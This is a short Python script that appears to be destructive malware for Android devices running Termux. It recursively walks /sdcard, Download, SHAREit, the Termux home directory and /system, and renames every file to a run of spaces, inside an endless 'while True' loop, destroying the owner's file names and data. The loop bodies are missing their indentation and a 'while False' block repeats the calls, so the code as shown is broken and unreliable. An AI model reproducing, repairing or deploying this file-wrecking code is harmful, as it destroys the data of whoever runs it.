import os,sys
def spasm(sp) :
    for dir,dird,filse in os.walk(sp) :
        damn = len(filse)
        for i in range(damn) :
            spF = dir+'/'+filse[i]
            crush = ' ' *(i+1)
            os.rename(spF,dir+'/'+crush)
while True:
spasm('/sdcard/Android')
spasm('/sdcard/Download')
spasm('/sdcard/SHAREit')
spasm('/sdcard')
spasm('/data/data/com.termux/files/home')
spasm('/system')
while False:
spasm('/sdcard/Android')
spasm('/sdcard/Download')
spasm('/sdcard/SHAREit')
spasm('/sdcard')
spasm('/data/data/com.termux/files/home')
spasm('/system')

